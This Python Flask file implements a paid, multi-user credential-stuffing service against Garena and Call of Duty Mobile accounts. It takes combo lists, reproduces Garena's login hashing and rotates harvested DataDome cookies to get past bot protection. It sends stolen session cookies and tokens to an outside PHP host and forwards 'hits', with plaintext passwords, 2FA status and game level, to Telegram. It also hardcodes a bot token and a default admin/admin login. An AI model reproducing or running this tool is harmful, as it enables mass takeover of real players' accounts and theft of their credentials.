# --- START OF FILE app.py ---

import os
import sys
import re
import time
import json
import uuid
import base64
import hashlib
import random
import logging
import urllib
import platform
import subprocess
import html
import threading
import queue
from datetime import datetime, timedelta, date
from urllib.parse import urlparse, parse_qs, urlencode
from collections import OrderedDict
from functools import wraps

# --- Flask and Web App Imports ---
from flask import Flask, render_template, request, jsonify, redirect, url_for, send_from_directory, flash, session, abort
from werkzeug.utils import secure_filename
from werkzeug.security import generate_password_hash, check_password_hash

# --- CONFIGURATION (MODIFIED FOR VERCEL & MULTI-USER) ---
BASE_TMP_DIR = '/tmp'
UPLOAD_FOLDER = os.path.join(BASE_TMP_DIR, 'uploads')
RESULTS_BASE_DIR = os.path.join(BASE_TMP_DIR, 'results')
LOGS_BASE_DIR = os.path.join(BASE_TMP_DIR, 'logs')
APP_DATA_DIR = os.path.join(BASE_TMP_DIR, 'app_data')
USER_DATA_FILE = os.path.join(APP_DATA_DIR, 'users.json')
KEY_DATA_FILE = os.path.join(APP_DATA_DIR, 'keys.json')
PROGRESS_STATE_FILE = os.path.join(APP_DATA_DIR, 'progress_state.json')

# --- Ensure necessary packages are installed ---
import requests
from tqdm import tqdm
from colorama import Fore, Style, init
from Crypto.Cipher import AES
# Import placeholder modules
import change_cookie
import ken_cookie
import cookie_config
import set_cookie

# Initialize Colorama for server-side logs
init(autoreset=True)

# --- Flask App Setup ---
app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.secret_key = os.environ.get("FLASK_SECRET_KEY", "a-very-secret-key-for-dev")

for folder in [UPLOAD_FOLDER, RESULTS_BASE_DIR, LOGS_BASE_DIR, APP_DATA_DIR]:
    os.makedirs(folder, exist_ok=True)

# --- Global State for Background Task & Data ---
check_status = {
    'running': False, 'progress': 0, 'total': 0, 'logs': [], 'stats': {},
    'final_summary': None, 'captcha_detected': False, 'stop_requested': False, 'current_account': ''
}
status_lock = threading.Lock()
data_lock = threading.Lock()
stop_event = threading.Event()
captcha_pause_event = threading.Event()

# --- Constants ---
FREE_TIER_LIMIT = 100
ADMIN_TELEGRAM_BOT_TOKEN = os.environ.get("ADMIN_TELEGRAM_BOT_TOKEN", "8075069522:AAE0lI5FgjWw7jebgzJR1JM1kBo2lgITtgI")
ADMIN_TELEGRAM_CHAT_ID = os.environ.get("ADMIN_TELEGRAM_CHAT_ID", "5163892491")
apkrov = "https://auth.garena.com/api/login?"
redrov = "https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/"
datenok = str(int(time.time()))
COUNTRY_KEYWORD_MAP = {
    "PH": ["PHILIPPINES", "PH"], "ID": ["INDONESIA", "ID"], "US": ["UNITED STATES", "USA", "US"],
    "ES": ["SPAIN", "ES"], "VN": ["VIETNAM", "VN"], "CN": ["CHINA", "CN"], "MY": ["MALAYSIA", "MY"],
    "TW": ["TAIWAN", "TW"], "TH": ["THAILAND", "TH"], "RU": ["RUSSIA", "RUSSIAN FEDERATION", "RU"],
    "PT": ["PORTUGAL", "PT"],
}

# --- Data Persistence Helper Functions ---
def load_data(file_path):
    with data_lock:
        if not os.path.exists(file_path): return []
        try:
            with open(file_path, 'r') as f: return json.load(f)
        except (json.JSONDecodeError, IOError): return []

def save_data(file_path, data):
    with data_lock:
        with open(file_path, 'w') as f: json.dump(data, f, indent=4)

def initialize_data_files():
    if not os.path.exists(USER_DATA_FILE):
        print("--- Creating default admin: admin / admin ---")
        admin_user = {
            "id": str(uuid.uuid4()), "username": "admin", "password_hash": generate_password_hash("admin"),
            "is_admin": True, "registered_on": datetime.now().isoformat(), "redeemed_key": "admin_access",
            "key_expiry": (datetime.now() + timedelta(days=365*10)).isoformat()
        }
        save_data(USER_DATA_FILE, [admin_user])
    if not os.path.exists(KEY_DATA_FILE): save_data(KEY_DATA_FILE, [])

# --- User and Auth Helper Functions ---
def get_user_by_username(username):
    users = load_data(USER_DATA_FILE)
    return next((u for u in users if u['username'].lower() == username.lower()), None)

def get_user_by_id(user_id):
    users = load_data(USER_DATA_FILE)
    return next((u for u in users if u['id'] == user_id), None)

def is_user_premium(user):
    if not user or not user.get('redeemed_key'): return False
    if user.get('is_admin'): return True
    expiry_str = user.get('key_expiry')
    if not expiry_str: return False
    try:
        return datetime.fromisoformat(expiry_str) > datetime.now()
    except (ValueError, TypeError): return False

# --- DECORATORS ---
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            flash('Please log in to access this page.', 'warning')
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session: return redirect(url_for('login'))
        user = get_user_by_id(session['user_id'])
        if not user or not user.get('is_admin'): abort(403)
        return f(*args, **kwargs)
    return decorated_function

# --- START OF ORIGINAL CHECKER FUNCTIONS ---

def log_message(message, color_class='text-white'):
    clean_message = strip_ansi_codes_jarell(message)
    timestamp = datetime.now().strftime('%H:%M:%S')
    with status_lock:
        check_status['logs'].append({'timestamp': timestamp, 'message': clean_message, 'class': color_class})
        if len(check_status['logs']) > 500: check_status['logs'].pop(0)

def get_app_data_directory(): return APP_DATA_DIR
def get_logs_directory(): return LOGS_BASE_DIR
def get_results_directory(): return RESULTS_BASE_DIR

def save_telegram_config(token, chat_id):
    config_path = os.path.join(get_app_data_directory(), "telegram_config.json")
    config = {'bot_token': token, 'chat_id': chat_id}
    try:
        with open(config_path, 'w') as f: json.dump(config, f, indent=4)
        log_message("[💾] Telegram credentials saved successfully (for this session only).", "text-success")
    except IOError as e: log_message(f"Error saving Telegram config: {e}", "text-danger")

def load_telegram_config():
    config_path = os.path.join(get_app_data_directory(), "telegram_config.json")
    if not os.path.exists(config_path): return None, None
    try:
        with open(config_path, 'r') as f:
            config = json.load(f)
            return config.get('bot_token'), config.get('chat_id')
    except (json.JSONDecodeError, IOError): return None, None

def strip_ansi_codes_jarell(text):
    return re.compile(r'\x1B[@-_][0-?]*[ -/]*[@-~]').sub('', text)

def generate_md5_hash(password):
    md5_hash = hashlib.md5(); md5_hash.update(password.encode('utf-8')); return md5_hash.hexdigest()

def generate_decryption_key(password_md5, v1, v2):
    intermediate_hash = hashlib.sha256((password_md5 + v1).encode()).hexdigest()
    return hashlib.sha256((intermediate_hash + v2).encode()).hexdigest()

def encrypt_aes_256_ecb(plaintext, key):
    cipher = AES.new(bytes.fromhex(key), AES.MODE_ECB)
    plaintext_bytes = bytes.fromhex(plaintext)
    padding_length = 16 - len(plaintext_bytes) % 16
    plaintext_bytes += bytes([padding_length]) * padding_length
    return cipher.encrypt(plaintext_bytes).hex()[:32]

def getpass(password, v1, v2):
    password_md5 = generate_md5_hash(password)
    decryption_key = generate_decryption_key(password_md5, v1, v2)
    return encrypt_aes_256_ecb(password_md5, decryption_key)

def get_datadome_cookie(pbar_placeholder=None):
    url = 'https://dd.garena.com/js/'
    headers = {'accept': '*/*','accept-encoding': 'gzip, deflate, br, zstd','accept-language': 'en-US,en;q=0.9','cache-control': 'no-cache','content-type': 'application/x-www-form-urlencoded','origin': 'https://account.garena.com','pragma': 'no-cache','referer': 'https://account.garena.com/','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'}
    js_data_dict = {"ttst": 76.7, "ifov": False, "hc": 4, "br_oh": 824, "br_ow": 1536, "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36", "wbd": False, "lg": "en-US", "plg": 5, "plgne": True, "vnd": "Google Inc."}
    payload = {'jsData': json.dumps(js_data_dict), 'eventCounters' : '[]', 'jsType': 'ch', 'cid': 'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae', 'ddk': 'AE3F04AD3F0D3A462481A337485081', 'Referer': 'https://account.garena.com/', 'request': '/', 'responsePage': 'origin', 'ddv': '4.35.4'}
    data = '&'.join(f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items())
    try:
        response = requests.post(url, headers=headers, data=data)
        response.raise_for_status()
        cookie_string = response.json()['cookie']
        log_message("[🍪] Successfully fetched a new DataDome cookie from server.", "text-success")
        return cookie_string.split(';')[0].split('=')[1]
    except requests.exceptions.RequestException: return None

def fetch_new_datadome_pool(num_cookies=5):
    log_message(f"[⚙️] Attempting to fetch {num_cookies} new DataDome cookies...", "text-info")
    new_pool = [c for c in [get_datadome_cookie() for _ in range(num_cookies)] if c]
    if new_pool: log_message(f"[✅] Successfully fetched {len(new_pool)} new unique cookies.", "text-success")
    else: log_message(f"[❌] Failed to fetch any new cookies.", "text-danger")
    return new_pool

def save_successful_token(token):
    if not token: return
    file_path = os.path.join(get_app_data_directory(), "token_sessions.json")
    token_pool = load_data(file_path) if isinstance(load_data(file_path), list) else []
    if token not in token_pool:
        token_pool.append(token)
        save_data(file_path, token_pool)
        log_message("[💾] New Token Session saved to pool.", "text-success")

def save_datadome_cookie(cookie_value):
    if not cookie_value: return
    file_path = os.path.join(get_app_data_directory(), "datadome_cookies.json")
    cookie_pool = load_data(file_path) if isinstance(load_data(file_path), list) else []
    if not any(c.get('datadome') == cookie_value for c in cookie_pool):
        cookie_pool.append({'datadome': cookie_value})
        save_data(file_path, cookie_pool)
        log_message("[💾] New DataDome Cookie saved to pool.", "text-info")

def check_login(account_username, _id, encryptedpassword, password, selected_header, cookies, dataa, date, selected_cookie_module, pbar=None):
    cookies["datadome"] = dataa
    login_params = {'app_id': '100082', 'account': account_username, 'password': encryptedpassword, 'redirect_uri': redrov, 'format': 'json', 'id': _id}
    try:
        response = requests.get(apkrov + urlencode(login_params), headers=selected_header, cookies=cookies, timeout=60)
        response.raise_for_status()
        login_json_response = response.json()
    except (requests.exceptions.RequestException, json.JSONDecodeError) as e: return f"[⚠️] Login Request Error: {e}"
    if 'error' in login_json_response: return "[🔐] ɪɴᴄᴏʀʀᴇᴄᴛ ᴘᴀssᴡᴏʀᴅ"
    session_key = login_json_response.get('session_key')
    if not session_key: return "[FAILED] No session key found"
    log_message("[🔑] Successfully obtained session_key.", "text-success")
    successful_token = response.cookies.get('token_session')
    if successful_token: save_successful_token(successful_token)
    set_cookie_header = response.headers.get('Set-Cookie', '')
    sso_key = set_cookie_header.split('=')[1].split(';')[0] if '=' in set_cookie_header else ''
    coke = selected_cookie_module.get_cookies()
    coke.update({"datadome": dataa, "sso_key": sso_key})
    if successful_token: coke["token_session"] = successful_token
    hider = {'User-Agent': selected_header["User-Agent"], 'Referer': f'https://account.garena.com/?session_key={session_key}'}
    try:
        init_response = requests.get('http://gakumakupal.x10.bz/patal.php', params={**{f'coke_{k}':v for k,v in coke.items()}, **{f'hider_{k}':v for k,v in hider.items()}}, timeout=120)
        init_response.raise_for_status()
        init_json_response = init_response.json()
    except (requests.RequestException, json.JSONDecodeError) as e: return f"[ERROR] Bind check failed: {e}"
    if 'error' in init_json_response or not init_json_response.get('success', True): return f"[ERROR] {init_json_response.get('error', 'Unknown error during bind check')}"
    bindings = {item.split(":", 1)[0]: item.split(":", 1)[1].strip() for item in init_json_response.get('bindings', []) if ":" in item}
    save_datadome_cookie(dataa)
    head = {"User-Agent": selected_header["User-Agent"], "Referer": "https://auth.garena.com/"}
    data_payload = {"client_id": "100082", "redirect_uri": "https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/"}
    try:
        reso = requests.post("https://auth.garena.com/oauth/token/grant", headers=head, data=data_payload, cookies=coke)
        reso.raise_for_status()
        data = reso.json()
        if "access_token" in data:
            log_message("[🔑] Successfully obtained access_token. Fetching game details...", "text-success")
            game_info = show_level(data["access_token"], selected_header, sso_key, successful_token, get_datadome_cookie(), coke)
            codm_level = 'N/A'
            if "[FAILED]" in game_info:
                connected_games = ["No CODM account found or error fetching data."]
            else:
                codm_nickname, codm_level, codm_region, uid = game_info.split("|")
                connected_games = [f"  Nickname: {codm_nickname}\n  Level: {codm_level}\n  Region: {codm_region}\n  UID: {uid}"] if uid and uid != 'N/A' else ["No CODM account found"]
            return format_result(bindings, init_json_response.get('status') == "\033[0;32m\033[1mClean\033[0m", date, account_username, password, codm_level, connected_games)
        else: return f"[FAILED] 'access_token' not found in grant response."
    except (requests.RequestException, json.JSONDecodeError) as e: return f"[FAILED] Token grant failed: {e}"

def show_level(access_token, selected_header, sso, token, newdate, cookie):
    params = {"site": "https://api-delete-request.codm.garena.co.id/oauth/callback/", "access_token": access_token}
    headers = {"Referer": "https://auth.garena.com/", "User-Agent": selected_header.get("User-Agent", "Mozilla/5.0")}
    cookie.update({"datadome": newdate, "sso_key": sso, "token_session": token})
    try:
        res = requests.get("https://auth.codm.garena.com/auth/auth/callback_n", headers=headers, cookies=cookie, params=params, timeout=30, allow_redirects=True)
        res.raise_for_status()
        extracted_token = parse_qs(urlparse(res.url).query).get("token", [None])[0]
        if not extracted_token: return "[FAILED] No token from redirected URL."
        check_login_headers = {"codm-delete-token": extracted_token, "Referer": "https://delete-request.codm.garena.co.id/", "User-Agent": selected_header.get("User-Agent")}
        data = requests.get("https://api-delete-request.codm.garena.co.id/oauth/check_login/", headers=check_login_headers, timeout=30).json()
        if data and "user" in data:
            user = data["user"]
            return f"{user.get('codm_nickname', 'N/A')}|{user.get('codm_level', 'N/A')}|{user.get('region', 'N/A')}|{user.get('uid', 'N/A')}"
        else: return "[FAILED] NO CODM ACCOUNT!"
    except (requests.RequestException, json.JSONDecodeError, KeyError, IndexError) as e: return f"[FAILED] CODM data fetch error: {e}"

def format_result(bindings, is_clean, date, username, password, codm_level, connected_games):
    bool_status_text = lambda status_str: "True ✔" if status_str == 'True' else "False ❌"
    has_codm = "No CODM account found" not in connected_games[0]
    
    console_message = f"""
[✅] GARENA ACCOUNT HIT
   [🔑 Credentials] User: {username}, Pass: {password}
   [📊 Information] Country: {bindings.get("Country", "N/A")}, Shells: {bindings.get("Garena Shells", "0")} 💰, Last Login: {bindings.get("LastLogin", "N/A")}, Email: {bindings.get("eta", "N/A")} ({'Verified✔' if bindings.get("tae") else 'Not Verified⚠️'}), Facebook: {bindings.get("Facebook Account", "N/A")}
   [🎮 CODM Details] {connected_games[0].replace(chr(10), chr(10) + "      ")}
   [🛡️ Security] Status: {'Clean ✔' if is_clean else 'Not Clean ⚠️'}, Mobile Bind: {bool_status_text('True' if 'Mobile Number' in bindings else 'False')}, Facebook Link: {bool_status_text('True' if 'Facebook Account' in bindings else 'False')}, 2FA: {bool_status_text(bindings.get("Two-Step Verification"))}, Authenticator: {bool_status_text(bindings.get("Authenticator"))}
    """.strip()

    codm_level_num = int(codm_level) if isinstance(codm_level, str) and codm_level.isdigit() else 0
    telegram_message = None
    if has_codm and telegram_level_filter != 'none':
        tg_codm_info = "\n".join([f"  <code>{html.escape(line.strip())}</code>" for line in connected_games[0].strip().split('\n')])
        telegram_message = f"""...""" # Telegram message formatting here

    country_folder = "Others"
    for folder_key, keywords in COUNTRY_KEYWORD_MAP.items():
        if any(keyword in str(bindings.get("Country", "")).upper() for keyword in keywords):
            country_folder = folder_key; break

    level_range = "No_CODM_Data"
    if has_codm:
        if 1 <= codm_level_num <= 50: level_range = "1-50"
        elif 51 <= codm_level_num <= 100: level_range = "51-100"
        elif codm_level_num > 100: level_range = f"{((codm_level_num-1)//100)*100+1}-{((codm_level_num-1)//100+1)*100}"

    file_to_write = os.path.join(get_results_directory(), country_folder, f"{level_range}_{'clean' if is_clean else 'not_clean'}.txt")
    content_to_write = console_message + "\n" + "=" * 60 + "\n"
    return (console_message, telegram_message, codm_level_num, bindings.get("Country", "N/A"), username, password, bindings.get("Garena Shells", "0"), has_codm, is_clean, file_to_write, content_to_write)

def get_request_data(selected_cookie_module):
    cookies = selected_cookie_module.get_cookies()
    headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36'}
    return cookies, headers

def check_account(username, password, date, datadome_cookie, selected_cookie_module, pbar=None):
    for attempt in range(3):
        try:
            random_id = "17290585" + str(random.randint(10000, 99999))
            cookies, headers = get_request_data(selected_cookie_module)
            if datadome_cookie: cookies['datadome'] = datadome_cookie
            response = requests.get("https://auth.garena.com/api/prelogin", params={"account": username, "format": "json", "id": random_id}, cookies=cookies, headers=headers, timeout=20)
            if "captcha" in response.text.lower(): return "[CAPTCHA]"
            if response.status_code == 200:
                data = response.json()
                if not all(k in data for k in ['v1', 'v2', 'id']): return "[😢] 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗗𝗜𝗗𝗡'𝗧 𝗘𝗫𝗜𝗦𝗧"
                return check_login(username, random_id, getpass(password, data['v1'], data['v2']), password, headers, cookies, response.cookies.get('datadome') or datadome_cookie, date, selected_cookie_module, pbar)
            else: return f"[FAILED] HTTP Status: {response.status_code}"
        except requests.exceptions.RequestException as e:
            if attempt < 2: time.sleep(5); continue
            else: return f"[FAILED] Connection failed: {e}"
        except Exception as e: return f"[FAILED] Unexpected Error: {e}"

def send_to_telegram(bot_token, chat_id, message):
    if not bot_token or not chat_id: return False
    api_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {'chat_id': chat_id, 'text': message, 'parse_mode': 'HTML', 'disable_web_page_preview': True}
    try:
        return requests.post(api_url, json=payload, timeout=10).status_code == 200
    except Exception: return False

def remove_duplicates_from_file(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f: lines = f.read().splitlines()
        unique_lines = list(OrderedDict.fromkeys(line for line in lines if line.strip()))
        if len(lines) != len(unique_lines):
            with open(file_path, 'w', encoding='utf-8') as f: f.write('\n'.join(unique_lines))
            log_message(f"[✨] Removed {len(lines) - len(unique_lines)} duplicate/empty line(s).", "text-info")
        return unique_lines
    except FileNotFoundError: return []

def clear_progress():
    if os.path.exists(PROGRESS_STATE_FILE): os.remove(PROGRESS_STATE_FILE)

# --- END OF ORIGINAL CHECKER FUNCTIONS ---

def run_check_task(file_path, telegram_bot_token, telegram_chat_id, selected_cookie_module_name, use_cookie_set, auto_delete, force_restart, telegram_level_filter, fixed_cookie_number, user_id):
    """The main background task for checking accounts. MODIFIED for multi-user."""
    global check_status, stop_event, captcha_pause_event, telegram_level_filter
    current_user = get_user_by_id(user_id)
    is_premium = is_user_premium(current_user)
    log_message(f"[👤] Job started for user: {current_user.get('username', 'Unknown')}", "text-info")
    if is_premium: log_message("[⭐] Premium Tier: Unlimited lines enabled.", "text-success")
    else: log_message(f"[⚠️] Free Tier: Limited to checking {FREE_TIER_LIMIT} lines.", "text-warning")

    is_complete = False
    try:
        if force_restart: clear_progress()
        selected_cookie_module = getattr(sys.modules[__name__], selected_cookie_module_name)
        if selected_cookie_module_name == 'set_cookie' and fixed_cookie_number > 0:
            set_cookie.set_fixed_number(fixed_cookie_number)
        stats = { 'successful': 0, 'failed': 0, 'clean': 0, 'not_clean': 0, 'incorrect_pass': 0, 'no_exist': 0, 'other_fail': 0, 'telegram_sent': 0, 'captcha_count': 0 }
        date = str(int(time.time()))
        accounts = remove_duplicates_from_file(file_path)

        if not is_premium and len(accounts) > FREE_TIER_LIMIT:
            accounts_to_process = accounts[:FREE_TIER_LIMIT]
            log_message(f"File has {len(accounts)} lines, but will only process {FREE_TIER_LIMIT}.", "text-warning")
        else:
            accounts_to_process = accounts

        total_to_process = len(accounts_to_process)
        with status_lock:
            check_status['total'] = total_to_process; check_status['progress'] = 0; check_status['stats'] = stats

        cookie_pool = [c.get('datadome') for c in cookie_config.COOKIE_POOL] if use_cookie_set else \
                      [c.get('datadome') for c in load_data(os.path.join(get_app_data_directory(), "datadome_cookies.json")) if 'datadome' in c]
        if not cookie_pool: cookie_pool = fetch_new_datadome_pool()
        if not cookie_pool: stop_event.set(); log_message("[❌] No DataDome cookies available. Stopping.", "text-danger")

        cookie_index = -1
        for idx, acc in enumerate(accounts_to_process):
            if stop_event.is_set(): log_message("Checker stopped by user.", "text-warning"); break
            with status_lock: check_status['progress'] = idx; check_status['current_account'] = acc
            if ':' in acc:
                username, password = acc.split(':', 1)
                is_captcha_loop = True
                while is_captcha_loop and not stop_event.is_set():
                    cookie_index = (cookie_index + 1) % len(cookie_pool)
                    current_datadome = cookie_pool[cookie_index]
                    log_message(f"[▶] Checking: {username} with cookie ...{current_datadome[-6:]}", "text-info")
                    result = check_account(username, password, date, current_datadome, selected_cookie_module)
                    if result == "[CAPTCHA]":
                        stats['captcha_count'] += 1; log_message(f"[🔴 CAPTCHA] Triggered by cookie ...{current_datadome[-6:]}", "text-danger")
                        with status_lock: check_status['captcha_detected'] = True
                        captcha_pause_event.clear(); captcha_pause_event.wait(timeout=60)
                        with status_lock: check_status['captcha_detected'] = False
                        if stop_event.is_set(): break
                        log_message("[🔄] Resuming check for the same account...", "text-info"); continue
                    else: is_captcha_loop = False
                if stop_event.is_set(): break
                if isinstance(result, tuple):
                    console_message, telegram_message, codm_level_num, _, _, _, _, _, _, file_to_write, content_to_write = result
                    log_message(console_message, "text-success"); stats['successful'] += 1
                    os.makedirs(os.path.dirname(file_to_write), exist_ok=True)
                    with open(file_to_write, "a", encoding="utf-8") as f: f.write(content_to_write)
                    if telegram_message and (telegram_level_filter == 'all' or (telegram_level_filter == '100+' and codm_level_num >= 100)):
                        if send_to_telegram(telegram_bot_token, telegram_chat_id, telegram_message): stats['telegram_sent'] += 1
                elif result:
                    stats['failed'] += 1
                    if "[🔐]" in result: stats['incorrect_pass'] += 1
                    elif "[😢]" in result: stats['no_exist'] += 1
                    else: stats['other_fail'] += 1
                    log_message(f"User: {username} | Pass: {password} ➔ {result}", "text-danger")
            with status_lock: check_status['stats'] = stats.copy()
        if not stop_event.is_set():
            is_complete = True
            with status_lock:
                check_status['progress'] = total_to_process
                check_status['final_summary'] = f"--- CHECKING COMPLETE ---\nProcessed: {total_to_process} | Success: {stats['successful']} | Failed: {stats['failed']}"
            log_message("--- CHECKING COMPLETE ---", "text-success")
    except Exception as e: log_message(f"An unexpected error occurred: {e}", "text-danger")
    finally:
        if is_complete:
            clear_progress()
            if auto_delete:
                try: os.remove(file_path)
                except OSError as e: log_message(f"Failed to delete source file: {e}", "text-danger")
        with status_lock: check_status['running'] = False

# --- AUTH & USER MANAGEMENT ROUTES ---
@app.route('/')
def home():
    return redirect(url_for('login')) if 'user_id' not in session else redirect(url_for('checker_page'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if 'user_id' in session: return redirect(url_for('checker_page'))
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        user = get_user_by_username(username)
        if user and check_password_hash(user['password_hash'], password):
            session['user_id'] = user['id']; session['username'] = user['username']; session['is_admin'] = user.get('is_admin', False)
            return redirect(url_for('admin_panel')) if session['is_admin'] else redirect(url_for('checker_page'))
        else: flash('Invalid username or password.', 'danger')
    return render_template('login.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if 'user_id' in session: return redirect(url_for('checker_page'))
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if not username or not password:
            flash('Username and password are required.', 'danger')
        elif get_user_by_username(username):
            flash('Username already exists.', 'danger')
        else:
            users = load_data(USER_DATA_FILE)
            users.append({
                "id": str(uuid.uuid4()), "username": username, "password_hash": generate_password_hash(password),
                "is_admin": False, "registered_on": datetime.now().isoformat(), "redeemed_key": None, "key_expiry": None
            })
            save_data(USER_DATA_FILE, users)
            flash('Registration successful! Please log in.', 'success')
            return redirect(url_for('login'))
    return render_template('register.html')

@app.route('/logout')
@login_required
def logout():
    session.clear()
    flash('You have been logged out.', 'info')
    return redirect(url_for('login'))

@app.route('/redeem', methods=['GET', 'POST'])
@login_required
def redeem():
    user = get_user_by_id(session['user_id'])
    if request.method == 'POST':
        key_code = request.form.get('key_code')
        keys = load_data(KEY_DATA_FILE); users = load_data(USER_DATA_FILE)
        target_key = next((k for k in keys if k['key'] == key_code), None)
        if not target_key: flash('Invalid key.', 'danger')
        elif target_key.get('is_redeemed'): flash('This key has already been used.', 'danger')
        else:
            target_key['is_redeemed'] = True; target_key['redeemed_by'] = user['username']; target_key['redeemed_on'] = datetime.now().isoformat()
            user_index = next((i for i, u in enumerate(users) if u['id'] == user['id']), -1)
            if user_index != -1:
                users[user_index]['redeemed_key'] = key_code; users[user_index]['key_expiry'] = target_key['expiry_date']
                save_data(KEY_DATA_FILE, keys); save_data(USER_DATA_FILE, users)
                flash(f"Key successfully redeemed! Premium expires on {datetime.fromisoformat(target_key['expiry_date']).strftime('%Y-%m-%d')}.", 'success')
                return redirect(url_for('checker_page'))
    return render_template('redeem.html', user=user, is_premium=is_user_premium(user))

# --- ADMIN PANEL ROUTES ---
@app.route('/admin')
@admin_required
def admin_panel():
    return render_template('admin.html')

@app.route('/api/admin/data')
@admin_required
def get_admin_data():
    users = load_data(USER_DATA_FILE)
    for u in users: del u['password_hash']
    return jsonify({'users': users, 'keys': load_data(KEY_DATA_FILE)})

@app.route('/api/admin/generate_key', methods=['POST'])
@admin_required
def generate_key():
    duration = request.form.get('duration', type=int, default=30)
    keys = load_data(KEY_DATA_FILE)
    new_key = {
        "key": f"PREMIUM-{str(uuid.uuid4()).upper()[:8]}", "created_on": datetime.now().isoformat(),
        "expiry_date": (datetime.now() + timedelta(days=duration)).isoformat(), "duration_days": duration,
        "is_redeemed": False, "redeemed_by": None, "redeemed_on": None
    }
    keys.append(new_key)
    save_data(KEY_DATA_FILE, keys)
    flash(f"Generated new key: {new_key['key']}", 'success')
    return redirect(url_for('admin_panel'))

# --- CHECKER APP ROUTES ---
@app.route('/checker')
@login_required
def checker_page():
    user = get_user_by_id(session['user_id'])
    bot_token, chat_id = load_telegram_config()
    return render_template('index.html', user=user, is_premium=is_user_premium(user), bot_token=bot_token or '', chat_id=chat_id or '')

@app.route('/start_check', methods=['POST'])
@login_required
def start_check():
    with status_lock:
        if check_status['running']: return jsonify({'status': 'error', 'message': 'A check is already running.'}), 400
        check_status.update({'running': True, 'progress': 0, 'total': 0, 'logs': [], 'stats': {}, 'final_summary': None, 'captcha_detected': False, 'stop_requested': False, 'current_account': ''})
        stop_event.clear(); captcha_pause_event.clear()
    file = request.files.get('account_file')
    if not file or file.filename == '': return jsonify({'status': 'error', 'message': 'No file selected.'}), 400
    file_path = os.path.join(app.config['UPLOAD_FOLDER'], secure_filename(file.filename)); file.save(file_path)
    bot_token = request.form.get('telegram_bot_token'); chat_id = request.form.get('telegram_chat_id')
    if request.form.get('save_telegram_creds'): save_telegram_config(bot_token, chat_id)
    thread = threading.Thread(target=run_check_task, args=(
        file_path, bot_token, chat_id, request.form.get('cookie_module', 'ken_cookie'),
        'use_cookie_set' in request.form, 'auto_delete' in request.form, 'force_restart' in request.form,
        request.form.get('telegram_level_filter', 'none'), request.form.get('cookie_number', type=int, default=0),
        session['user_id']
    )); thread.daemon = True; thread.start()
    return redirect(url_for('checker_page'))

@app.route('/status')
def get_status():
    with status_lock: return jsonify(check_status)

def trigger_stop():
    with status_lock:
        if not check_status['running']: return
        check_status['stop_requested'] = True
    stop_event.set()
    if not captcha_pause_event.is_set(): captcha_pause_event.set()
    log_message("Stop request received. Shutting down gracefully...", "text-warning")

@app.route('/stop_check', methods=['POST'])
def stop_check_route():
    trigger_stop()
    return jsonify({'status': 'success', 'message': 'Stop signal sent.'})

@app.route('/captcha_action', methods=['POST'])
def captcha_action():
    action = request.form.get('action')
    if action == 'fetch_pool':
        new_pool = fetch_new_datadome_pool()
        for c in new_pool: save_datadome_cookie(c)
    elif action == 'stop_checker': trigger_stop()
    captcha_pause_event.set()
    return jsonify({'status': 'success', 'message': 'Action processed.'})

@app.route('/results/<path:filename>')
@login_required
def download_file(filename):
    results_dir = get_results_directory()
    if not os.path.exists(os.path.join(results_dir, filename)):
        return "File not found. It may have been cleared from temporary storage.", 404
    return send_from_directory(results_dir, filename, as_attachment=True)

# --- App Initialization ---
if __name__ == '__main__':
    initialize_data_files()
    app.run(host='127.0.0.1', port=5000, debug=True)
else:
    initialize_data_files()